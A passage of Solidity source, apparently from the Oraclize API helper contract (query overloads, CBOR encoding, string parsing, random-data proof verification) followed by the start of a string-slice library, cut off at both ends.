gaslimit);\n if (price > 1 ether + tx.gasprice * gaslimit) return 0;\n bytes memory args = ba2cbor(argN);\n return oraclize.queryN_withGasLimit.value(price)(0, datasource, args, gaslimit);\n }\n function oraclize_query(string datasource, bytes[1] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](1);\n dynargs[0] = args[0];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[1] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](1);\n dynargs[0] = args[0];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[1] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](1);\n dynargs[0] = args[0];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[1] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](1);\n dynargs[0] = args[0];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[2] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[2] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[2] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[2] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[3] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[3] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[3] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[3] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[4] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[4] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[4] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[4] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[5] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[5] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[5] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[5] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_cbAddress() oraclizeAPI internal returns (address){\n return oraclize.cbAddress();\n }\n function oraclize_setProof(byte proofP) oraclizeAPI internal {\n return oraclize.setProofType(proofP);\n }\n function oraclize_setCustomGasPrice(uint gasPrice) oraclizeAPI internal {\n return oraclize.setCustomGasPrice(gasPrice);\n }\n function oraclize_setConfig(bytes32 config) oraclizeAPI internal {\n return oraclize.setConfig(config);\n }\n function oraclize_randomDS_getSessionPubKeyHash() oraclizeAPI internal returns (bytes32){\n return oraclize.randomDS_getSessionPubKeyHash();\n }\n function getCodeSize(address _addr) constant internal returns (uint _size) {\n assembly {\n _size := extcodesize(_addr)\n }\n }\n function parseAddr(string _a) internal returns (address){\n bytes memory tmp = bytes(_a);\n uint160 iaddr = 0;\n uint160 b1;\n uint160 b2;\n for (uint i = 2; i < 2 + 2 * 20; i += 2) {\n iaddr *= 256;\n b1 = uint160(tmp[i]);\n b2 = uint160(tmp[i + 1]);\n if ((b1 >= 97) && (b1 <= 102)) b1 -= 87;\n else if ((b1 >= 65) && (b1 <= 70)) b1 -= 55;\n else if ((b1 >= 48) && (b1 <= 57)) b1 -= 48;\n if ((b2 >= 97) && (b2 <= 102)) b2 -= 87;\n else if ((b2 >= 65) && (b2 <= 70)) b2 -= 55;\n else if ((b2 >= 48) && (b2 <= 57)) b2 -= 48;\n iaddr += (b1 * 16 + b2);\n }\n return address(iaddr);\n }\n function strCompare(string _a, string _b) internal returns (int) {\n bytes memory a = bytes(_a);\n bytes memory b = bytes(_b);\n uint minLength = a.length;\n if (b.length < minLength) minLength = b.length;\n for (uint i = 0; i < minLength; i ++)\n if (a[i] < b[i])\n return - 1;\n else if (a[i] > b[i])\n return 1;\n if (a.length < b.length)\n return - 1;\n else if (a.length > b.length)\n return 1;\n else\n return 0;\n }\n function indexOf(string _haystack, string _needle) internal returns (int) {\n bytes memory h = bytes(_haystack);\n bytes memory n = bytes(_needle);\n if (h.length < 1 || n.length < 1 || (n.length > h.length))\n return - 1;\n else if (h.length > (2 ** 128 - 1))\n return - 1;\n else\n {\n uint subindex = 0;\n for (uint i = 0; i < h.length; i ++)\n {\n if (h[i] == n[0])\n {\n subindex = 1;\n while (subindex < n.length && (i + subindex) < h.length && h[i + subindex] == n[subindex])\n {\n subindex++;\n }\n if (subindex == n.length)\n return int(i);\n }\n }\n return - 1;\n }\n }\n function strConcat(string _a, string _b, string _c, string _d, string _e) internal returns (string) {\n bytes memory _ba = bytes(_a);\n bytes memory _bb = bytes(_b);\n bytes memory _bc = bytes(_c);\n bytes memory _bd = bytes(_d);\n bytes memory _be = bytes(_e);\n string memory abcde = new string(_ba.length + _bb.length + _bc.length + _bd.length + _be.length);\n bytes memory babcde = bytes(abcde);\n uint k = 0;\n for (uint i = 0; i < _ba.length; i++) babcde[k++] = _ba[i];\n for (i = 0; i < _bb.length; i++) babcde[k++] = _bb[i];\n for (i = 0; i < _bc.length; i++) babcde[k++] = _bc[i];\n for (i = 0; i < _bd.length; i++) babcde[k++] = _bd[i];\n for (i = 0; i < _be.length; i++) babcde[k++] = _be[i];\n return string(babcde);\n }\n function strConcat(string _a, string _b, string _c, string _d) internal returns (string) {\n return strConcat(_a, _b, _c, _d, \"\");\n }\n function strConcat(string _a, string _b, string _c) internal returns (string) {\n return strConcat(_a, _b, _c, \"\", \"\");\n }\n function strConcat(string _a, string _b) internal returns (string) {\n return strConcat(_a, _b, \"\", \"\", \"\");\n }\n function parseInt(string _a) internal returns (uint) {\n return parseInt(_a, 0);\n }\n function parseInt(string _a, uint _b) internal returns (uint) {\n bytes memory bresult = bytes(_a);\n uint mint = 0;\n bool decimals = false;\n for (uint i = 0; i < bresult.length; i++) {\n if ((bresult[i] >= 48) && (bresult[i] <= 57)) {\n if (decimals) {\n if (_b == 0) break;\n else _b--;\n }\n mint *= 10;\n mint += uint(bresult[i]) - 48;\n }\n else if (bresult[i] == 46) decimals = true;\n }\n if (_b > 0) mint *= 10 ** _b;\n return mint;\n }\n function uint2str(uint i) internal returns (string){\n if (i == 0) return \"0\";\n uint j = i;\n uint len;\n while (j != 0) {\n len++;\n j /= 10;\n }\n bytes memory bstr = new bytes(len);\n uint k = len - 1;\n while (i != 0) {\n bstr[k--] = byte(48 + i % 10);\n i /= 10;\n }\n return string(bstr);\n }\n function stra2cbor(string[] arr) internal returns (bytes) {\n uint arrlen = arr.length;\n uint outputlen = 0;\n bytes[] memory elemArray = new bytes[](arrlen);\n for (uint i = 0; i < arrlen; i++) {\n elemArray[i] = (bytes(arr[i]));\n outputlen += elemArray[i].length + (elemArray[i].length - 1) / 23 + 3;\n }\n uint ctr = 0;\n uint cborlen = arrlen + 0x80;\n outputlen += byte(cborlen).length;\n bytes memory res = new bytes(outputlen);\n while (byte(cborlen).length > ctr) {\n res[ctr] = byte(cborlen)[ctr];\n ctr++;\n }\n for (i = 0; i < arrlen; i++) {\n res[ctr] = 0x5F;\n ctr++;\n for (uint x = 0; x < elemArray[i].length; x++) {\n if (x % 23 == 0) {\n uint elemcborlen = elemArray[i].length - x >= 24 ? 23 : elemArray[i].length - x;\n elemcborlen += 0x40;\n uint lctr = ctr;\n while (byte(elemcborlen).length > ctr - lctr) {\n res[ctr] = byte(elemcborlen)[ctr - lctr];\n ctr++;\n }\n }\n res[ctr] = elemArray[i][x];\n ctr++;\n }\n res[ctr] = 0xFF;\n ctr++;\n }\n return res;\n }\n function ba2cbor(bytes[] arr) internal returns (bytes) {\n uint arrlen = arr.length;\n uint outputlen = 0;\n bytes[] memory elemArray = new bytes[](arrlen);\n for (uint i = 0; i < arrlen; i++) {\n elemArray[i] = (bytes(arr[i]));\n outputlen += elemArray[i].length + (elemArray[i].length - 1) / 23 + 3;\n }\n uint ctr = 0;\n uint cborlen = arrlen + 0x80;\n outputlen += byte(cborlen).length;\n bytes memory res = new bytes(outputlen);\n while (byte(cborlen).length > ctr) {\n res[ctr] = byte(cborlen)[ctr];\n ctr++;\n }\n for (i = 0; i < arrlen; i++) {\n res[ctr] = 0x5F;\n ctr++;\n for (uint x = 0; x < elemArray[i].length; x++) {\n if (x % 23 == 0) {\n uint elemcborlen = elemArray[i].length - x >= 24 ? 23 : elemArray[i].length - x;\n elemcborlen += 0x40;\n uint lctr = ctr;\n while (byte(elemcborlen).length > ctr - lctr) {\n res[ctr] = byte(elemcborlen)[ctr - lctr];\n ctr++;\n }\n }\n res[ctr] = elemArray[i][x];\n ctr++;\n }\n res[ctr] = 0xFF;\n ctr++;\n }\n return res;\n }\n string oraclize_network_name;\n function oraclize_setNetworkName(string _network_name) internal {\n oraclize_network_name = _network_name;\n }\n function oraclize_getNetworkName() internal returns (string) {\n return oraclize_network_name;\n }\n function oraclize_newRandomDSQuery(uint _delay, uint _nbytes, uint _customGasLimit) internal returns (bytes32){\n if ((_nbytes == 0) || (_nbytes > 32)) throw;\n bytes memory nbytes = new bytes(1);\n nbytes[0] = byte(_nbytes);\n bytes memory unonce = new bytes(32);\n bytes memory sessionKeyHash = new bytes(32);\n bytes32 sessionKeyHash_bytes32 = oraclize_randomDS_getSessionPubKeyHash();\n assembly {\n mstore(unonce, 0x20)\n mstore(add(unonce, 0x20), xor(blockhash(sub(number, 1)), xor(coinbase, timestamp)))\n mstore(sessionKeyHash, 0x20)\n mstore(add(sessionKeyHash, 0x20), sessionKeyHash_bytes32)\n }\n bytes[3] memory args = [unonce, nbytes, sessionKeyHash];\n bytes32 queryId = oraclize_query(_delay, \"random\", args, _customGasLimit);\n oraclize_randomDS_setCommitment(queryId, sha3(bytes8(_delay), args[1], sha256(args[0]), args[2]));\n return queryId;\n }\n function oraclize_randomDS_setCommitment(bytes32 queryId, bytes32 commitment) internal {\n oraclize_randomDS_args[queryId] = commitment;\n }\n mapping (bytes32 => bytes32) oraclize_randomDS_args;\n mapping (bytes32 => bool) oraclize_randomDS_sessionKeysHashVerified;\n function verifySig(bytes32 tosignh, bytes dersig, bytes pubkey) internal returns (bool){\n bool sigok;\n address signer;\n bytes32 sigr;\n bytes32 sigs;\n bytes memory sigr_ = new bytes(32);\n uint offset = 4 + (uint(dersig[3]) - 0x20);\n sigr_ = copyBytes(dersig, offset, 32, sigr_, 0);\n bytes memory sigs_ = new bytes(32);\n offset += 32 + 2;\n sigs_ = copyBytes(dersig, offset + (uint(dersig[offset - 1]) - 0x20), 32, sigs_, 0);\n assembly {\n sigr := mload(add(sigr_, 32))\n sigs := mload(add(sigs_, 32))\n }\n (sigok, signer) = safer_ecrecover(tosignh, 27, sigr, sigs);\n if (address(sha3(pubkey)) == signer) return true;\n else {\n (sigok, signer) = safer_ecrecover(tosignh, 28, sigr, sigs);\n return (address(sha3(pubkey)) == signer);\n }\n }\n function oraclize_randomDS_proofVerify__sessionKeyValidity(bytes proof, uint sig2offset) internal returns (bool) {\n bool sigok;\n bytes memory sig2 = new bytes(uint(proof[sig2offset + 1]) + 2);\n copyBytes(proof, sig2offset, sig2.length, sig2, 0);\n bytes memory appkey1_pubkey = new bytes(64);\n copyBytes(proof, 3 + 1, 64, appkey1_pubkey, 0);\n bytes memory tosign2 = new bytes(1 + 65 + 32);\n tosign2[0] = 1;\n copyBytes(proof, sig2offset - 65, 65, tosign2, 1);\n bytes memory CODEHASH = hex\"fd94fa71bc0ba10d39d464d0d8f465efeef0a2764e3887fcc9df41ded20f505c\";\n copyBytes(CODEHASH, 0, 32, tosign2, 1 + 65);\n sigok = verifySig(sha256(tosign2), sig2, appkey1_pubkey);\n if (sigok == false) return false;\n bytes memory LEDGERKEY = hex\"7fb956469c5c9b89840d55b43537e66a98dd4811ea0a27224272c2e5622911e8537a2f8e86a46baec82864e98dd01e9ccc2f8bc5dfc9cbe5a91a290498dd96e4\";\n bytes memory tosign3 = new bytes(1 + 65);\n tosign3[0] = 0xFE;\n copyBytes(proof, 3, 65, tosign3, 1);\n bytes memory sig3 = new bytes(uint(proof[3 + 65 + 1]) + 2);\n copyBytes(proof, 3 + 65, sig3.length, sig3, 0);\n sigok = verifySig(sha256(tosign3), sig3, LEDGERKEY);\n return sigok;\n }\n modifier oraclize_randomDS_proofVerify(bytes32 _queryId, string _result, bytes _proof) {\n if ((_proof[0] != \"L\") || (_proof[1] != \"P\") || (_proof[2] != 1)) throw;\n bool proofVerified = oraclize_randomDS_proofVerify__main(_proof, _queryId, bytes(_result), oraclize_getNetworkName());\n if (proofVerified == false) throw;\n _;\n }\n function matchBytes32Prefix(bytes32 content, bytes prefix) internal returns (bool){\n bool match_ = true;\n for (var i = 0; i < prefix.length; i++) {\n if (content[i] != prefix[i]) match_ = false;\n }\n return match_;\n }\n function oraclize_randomDS_proofVerify__main(bytes proof, bytes32 queryId, bytes result, string context_name) internal returns (bool){\n bool checkok;\n uint ledgerProofLength = 3 + 65 + (uint(proof[3 + 65 + 1]) + 2) + 32;\n bytes memory keyhash = new bytes(32);\n copyBytes(proof, ledgerProofLength, 32, keyhash, 0);\n checkok = (sha3(keyhash) == sha3(sha256(context_name, queryId)));\n if (checkok == false) return false;\n bytes memory sig1 = new bytes(uint(proof[ledgerProofLength + (32 + 8 + 1 + 32) + 1]) + 2);\n copyBytes(proof, ledgerProofLength + (32 + 8 + 1 + 32), sig1.length, sig1, 0);\n checkok = matchBytes32Prefix(sha256(sig1), result);\n if (checkok == false) return false;\n bytes memory commitmentSlice1 = new bytes(8 + 1 + 32);\n copyBytes(proof, ledgerProofLength + 32, 8 + 1 + 32, commitmentSlice1, 0);\n bytes memory sessionPubkey = new bytes(64);\n uint sig2offset = ledgerProofLength + 32 + (8 + 1 + 32) + sig1.length + 65;\n copyBytes(proof, sig2offset - 64, 64, sessionPubkey, 0);\n bytes32 sessionPubkeyHash = sha256(sessionPubkey);\n if (oraclize_randomDS_args[queryId] == sha3(commitmentSlice1, sessionPubkeyHash)) {\n delete oraclize_randomDS_args[queryId];\n }\n else return false;\n bytes memory tosign1 = new bytes(32 + 8 + 1 + 32);\n copyBytes(proof, ledgerProofLength, 32 + 8 + 1 + 32, tosign1, 0);\n checkok = verifySig(sha256(tosign1), sig1, sessionPubkey);\n if (checkok == false) return false;\n if (oraclize_randomDS_sessionKeysHashVerified[sessionPubkeyHash] == false) {\n oraclize_randomDS_sessionKeysHashVerified[sessionPubkeyHash] = oraclize_randomDS_proofVerify__sessionKeyValidity(proof, sig2offset);\n }\n return oraclize_randomDS_sessionKeysHashVerified[sessionPubkeyHash];\n }\n function copyBytes(bytes from, uint fromOffset, uint length, bytes to, uint toOffset) internal returns (bytes) {\n uint minLength = length + toOffset;\n if (to.length < minLength) {\n throw;\n }\n uint i = 32 + fromOffset;\n uint j = 32 + toOffset;\n while (i < (32 + fromOffset + length)) {\n assembly {\n let tmp := mload(add(from, i))\n mstore(add(to, j), tmp)\n }\n i += 32;\n j += 32;\n }\n return to;\n }\n function safer_ecrecover(bytes32 hash, uint8 v, bytes32 r, bytes32 s) internal returns (bool, address) {\n bool ret;\n address addr;\n assembly {\n let size := mload(0x40)\n mstore(size, hash)\n mstore(add(size, 32), v)\n mstore(add(size, 64), r)\n mstore(add(size, 96), s)\n ret := call(3000, 1, 0, size, 128, size, 32)\n addr := mload(size)\n }\n return (ret, addr);\n }\n function ecrecovery(bytes32 hash, bytes sig) internal returns (bool, address) {\n bytes32 r;\n bytes32 s;\n uint8 v;\n if (sig.length != 65)\n return (false, 0);\n assembly {\n r := mload(add(sig, 32))\n s := mload(add(sig, 64))\n v\n := byte(0, mload(add(sig, 96)))\n }\nif (v < 27)\nv += 27;\nif (v != 27 && v != 28)\nreturn (false, 0);\nreturn safer_ecrecover(hash, v, r, s);\n}\n}\nlibrary strings {\nstruct slice {\nuint _len;\nuint _ptr;\n}\nfunction memcpy(uint dest, uint src, uint len) private {\nfor (; len >= 32; len -= 32) {\nassembly {\nmstore(dest, mload(src))\n}\ndest += 32;\nsrc += 32;\n}\nuint mask = 256 ** (32 - len) - 1;\nassembly {\nlet srcpart := and(mload(src), not(mask))\nlet destpart := and(mload(dest), mask)\nmstore(dest, or(destpart, srcpart))\n}\n}\nfunction toSlice(string self) internal returns (slice) {\nuint ptr;\nassembly {\nptr := add(self, 0x20)\n}\nreturn slice(bytes(self).length, ptr);\n}\nfunction len(bytes32 self) internal returns (uint) {\nuint ret;\nif (self == 0)\nreturn 0;\nif (self & 0xffffffffffffffffffffffffffffffff == 0) {\nret += 16;\nself = bytes32(uint(self) / 0x100000000000000000000000000000000);\n}\nif (self & 0xffffffffffffffff == 0) {\nret += 8;\nself = bytes32(uint(self) / 0x10000000000000000);\n}\nif (self & 0xffffffff == 0) {\nret += 4;\nself = bytes32(uint(self) / 0x100000000);\n}\nif (self & 0xffff == 0) {\nret += 2;\nself = bytes32(uint(self) / 0x10000);\n}\nif (self & 0xff == 0) {\nret += 1;\n}\nreturn 32 - ret;\n}\nfunction toSliceB32(bytes32 self) internal returns (slice ret) {\nassembly {\nlet ptr := mload(0x40)\nmstore(0x40, add(ptr, 0x20))\nmstore(ptr, self)\nmstore(add(ret, 0x20), ptr)\n}\nret._len = len(self);\n}\nfunction copy(slice self) internal returns (slice) {\nreturn slice(self._len, self._ptr);\n}\nfunction toString(slice self) internal returns (string) {\nvar ret = new string(self._len);\nuint retptr;\nassembly {retptr := add(ret, 32)}\nmemcpy(retptr, self._ptr, self._len);\nreturn ret;\n}\nfunction len(slice self) internal returns (uint) {\nvar ptr = self._ptr - 31;\nvar end = ptr + self._len;\nfor (uint len = 0; ptr < end; len++) {\nuint8 b;\nassembly {b := and(mload(ptr), 0xFF)}\nif (b < 0x80) {\nptr += 1;\n} else if (b < 0xE0) {\nptr += 2;\n} else if (b < 0xF0) {\nptr += 3;\n} else if (b < 0xF8) {\nptr += 4;\n} else if (b < 0xFC) {\nptr += 5;\n} else {\nptr += 6;\n}\n}\nreturn len;\n}\nfunction empty(slice self) internal returns (bool) {\nreturn self._len == 0;\n}\nfunction compare(slice self, slice other) internal returns (int) {\nuint shortest = self._len;\nif (other._len < self._len)\nshortest = other._len;\nvar selfptr = self._ptr;\nvar otherptr = other._ptr;\nfor (uint idx = 0; idx < shortest; idx += 32) {\nuint a;\nuint b;\nassembly {\na := mload(selfptr)\nb := mload(otherptr)\n}\nif (a != b) {\nuint mask = ~(2 ** (8 * (32 - shortest + idx)) - 1);\nvar diff = (a & mask) - (b & mask);\nif (diff != 0)\nreturn int(diff);\n}\nselfptr += 32;\notherptr += 32;\n}\nreturn int(self._len) - int(other._len);\n}\nfunction equals(slice self, slice other) internal returns (bool) {\nreturn compare(self, other) == 0;\n}\nfunction nextRune(slice self, slice rune) internal returns (slice) {\nrune._ptr = self._ptr;\nif (self._len == 0) {\nrune._len = 0;\nreturn rune;\n}\nuint len;\nuint b;\nassembly {b := and(mload(sub(mload(add(self, 32)), 31)), 0xFF)}\nif (b < 0x80) {\nlen = 1;\n} else if (b < 0xE0) {\nlen = 2;\n} else if (b < 0xF0) {\nlen = 3;\n} else {\nlen = 4;\n}\nif (len > self._len) {\nrune._len = self._len;\nself._ptr += self._len;\nself._len = 0;\nreturn rune;\n}\nself._ptr += len;\nself._len -= len;\nrune._len = len;\nreturn rune;\n}\nfunction nextRune(slice self) internal returns (slice ret) {\nnextRune(self, ret);\n}\nfunction ord(slice self) internal returns (uint ret) {\nif (self._len == 0) {\nreturn 0;\n}\nuint word;\nuint len;\nuint divisor = 2 ** 248;\nassembly {word := mload(mload(add(self, 32)))}\nvar b = word / divisor;\nif (b < 0x80) {\nret = b;\nlen = 1;\n} else if (b < 0xE0) {\nret = b & 0x1F;\nlen = 2;\n} else if (b < 0xF0) {\nret = b & 0x0F;\nlen = 3;\n} else {\nret = b & 0x07;\nlen = 4;\n}\nif (len > self._len) {\nreturn 0;\n}\nfor (uint i = 1; i < len; i++) {\ndivisor = divisor / 256;\nb = (word / divisor) & 0xFF;\nif (b & 0xC0 != 0x80) {\nreturn 0;\n}\nret = (ret * 64) | (b & 0x3F);\n}\nreturn ret;\n}\nfunction keccak(slice self) internal returns (bytes32 ret) {\nassembly {\nret := sha3(mload(add(self, 32)), mload(self))\n}\n}\nfunction startsWith(slice self, slice needle) internal returns (bool) {\nif (self._len < needle._len) {\nreturn false;\n}\nif (self._ptr == needle._ptr) {\nreturn true;\n}\nbool equal;\nassembly {\nlet len := mload(needle)\nlet selfptr := mload(add(self, 0x20))\nlet needleptr := mload(add(needle, 0x20))\nequal := eq(sha3(selfptr, len), sha3(needleptr, len))\n}\nreturn equal;\n}\nfunction beyond(slice self, slice needle) internal returns (slice) {\nif (self._len < needle._len) {\nreturn self;\n}\nbool equal = true;\nif (self._ptr != needle._ptr) {\nassembly {\nlet len := mload(needle)\nlet selfptr := mload(add(self, 0x20))\nlet needleptr := mload(add(needle, 0x20))\nequal := eq(sha3(selfptr, len), sha3(needleptr, len))\n}\n}\nif (equal) {\nself._len -= needle._len;\nself._ptr += needle._len;\n}\nreturn self;\n}\nfunction endsWith(slice self, slice needle) internal returns (bool) {\nif (self._len < needle._len) {\nreturn false;\n}\nvar selfptr = self._ptr + self._len - needle._len;\nif (selfptr == needle._ptr) {\nreturn true;\n}\nbool equal;\nassembly {\nlet len := mload(needle)\nlet needleptr := mload(add(needle, 0x20))\nequal := eq(sha3(selfptr, len), sha3(needleptr, len))\n}\nreturn equal;\n}\nfunction until(slice self, slice needle) internal returns (slice) {\nif (self._len < needle._len) {\nreturn self;\n}\nvar selfptr = self._ptr + self._len - needle._len;\nbool equal = true;\nif (selfptr != needle._ptr) {\nassembly {\nlet len := mload(needle)\nlet needleptr := mload(add(needle, 0x20))\nequal := eq(sha3(selfptr, len), sha3(needleptr, len))\n}\n}\nif (equal) {\nself._len -= needle._len;\n}\nreturn self;\n}\nfunction findPtr(uint selflen, uint selfptr, uint needlelen, uint needleptr) private returns (uint) {\nuint ptr;\nuint idx;\nif (needlelen <= selflen) {\nif (needlelen <= 32) {\nassembly {\nlet mask := not(sub(exp(2, mul(8, sub(32, needlelen))), 1))\nlet needledata := and(mload(needleptr), mask)\nlet end := add(selfptr, sub(selflen, needlelen))\nptr := selfptr\nloop :\njumpi(exit, eq(and(mload(ptr), mask), needledata))\nptr := add(ptr, 1)\njumpi(loop, lt(sub(ptr, 1), end))\nptr := add(selfptr, selflen)\nexit:\n}\nreturn ptr;\n} else {\nbytes32 hash;\nassembly {hash := sha3(needleptr, needlelen)}\nptr = selfptr;\nfor (idx = 0; idx <= selflen - needlelen; idx++) {\nbytes32 testHash;\nassembly {testHash := sha3(ptr, needlelen)}\nif (hash == testHash)\nreturn ptr;\nptr += 1;\n}\n}\n}\nreturn selfptr + selflen;\n}\nfunction rfindPtr(uint selflen, uint selfptr, uint needlelen, uint needleptr) private returns (uint) {\nuint ptr;\nif (needlelen <= selflen) {\nif (needlelen <= 32) {\nassembly {\nlet mask := not(sub(exp(2, mul(8, sub(32, needlelen))), 1))\nlet needledata := and(mload(needleptr), mask)\nptr := add(selfptr, sub(selflen, needlelen))\nloop :\njumpi(ret, eq(and(mload(ptr), mask), needledata))\nptr := sub(ptr, 1)\njumpi(loop, gt(add(ptr, 1), selfptr))\nptr := selfptr\njump(exit)\nret :\nptr := add(ptr, needlelen)\nexit :\n}\nreturn ptr;\n} else {\nbytes32 hash;\nassembly {hash := sha3(needleptr, needlelen)}\nptr = selfptr + (selflen - needlelen);\nwhile (ptr >= selfptr) {\nbytes32 testHash;\nassembly {testHash := sha3(ptr, needlelen)}\nif (hash == testHash)\nreturn ptr + needlelen;\nptr -= 1;\n}\n}\n}\nreturn selfptr;\n}\nfunction find(slice self, slice needle) internal returns (slice) {\nuint ptr = findPtr(self._len, self._ptr, needle._len, needle._ptr);\nself._len -= ptr - self._ptr;\nself._ptr = ptr;\nreturn self;\n}\nfunction rfind(slice self, slice needle) internal returns (slice) {\nuint ptr = rfindPtr(self._len, self._ptr, needle._len, needle._ptr);\nself._len = ptr - self._ptr;\nreturn self;\n}\nfunction split(slice self, slice needle, slice token) internal returns (slice) {\nuint ptr = findPtr(self._len, self._ptr, needle._len, needle._ptr);\ntoken._ptr = self._ptr;\ntoken._len = ptr - self._ptr;\nif (ptr == self._ptr + self._len) {\nself._len = 0;\n} else {\nself._len -= token._len + needle._len;\nself._ptr = ptr + needle._len;\n}\nreturn token;\n}\nfunction split(slice self, slice needle) internal returns (slice token) {\nsplit(self, needle, token);\n}\nfunction rsplit(slice self, slice needle, slice token) internal returns (slice) {\nuint ptr = rfindPtr(self._len, self._ptr, needle._len, needle._ptr);\ntoken._ptr = ptr;\ntoken._len = self._len - (ptr - self._ptr);\nif (ptr == self._ptr) {\nself._len = 0;\n} else {\nself._len -= token._len + needle._len;\n}\nreturn token;\n}\nfunction rsplit(slice self, slice needle) internal returns (slice token) {\nrsplit(self, needle, token);\n}\nfunction count(slice self, slice needle) internal returns (uint count) {\nuint ptr = findPtr(self._len, self._ptr, needle._len, needle._ptr) + needle._len;\nwhile (ptr <= self._ptr + self._len) {\ncount++;\nptr = findPtr(self._len - (ptr - self._ptr), ptr, needle._len, needle._ptr) + needle._len;\n}\n}\nfunction contains(slice self, slice needle) internal returns (bool) {\nreturn rfindPtr(self._len, self._ptr, needle._len, needle._ptr) != self._ptr;\n}\nfunction concat(slice self, slice other) internal returns (string) {\nvar ret = new string(self._len + other._len);\nuint retptr;\nassembly {retptr := add(ret, 32)}\nmemcpy(retptr, self._ptr, self._len);\nmemcpy(retptr + self._len, other._ptr, other._len);\nreturn ret;\n}\nfunction join(slice self, slice[] parts) internal returns (string) {\nif (parts.length == 0)\nreturn \"\";\nuint len = self._len * (parts.length - 1);\nfor (uint i = 0; i < parts.length; i++)\nlen += parts[i]._len;\nvar ret = new string(len);\nuint retptr;\nassembly {retptr := add(ret, 32)}\nfor (i = 0; i < parts.length; i++) {\nmemcpy(retptr, parts[i]._ptr, parts[i]._len);\nretptr += parts[i]._len;\nif (i < parts.length - 1) {\nmemcpy(retptr, self._ptr, 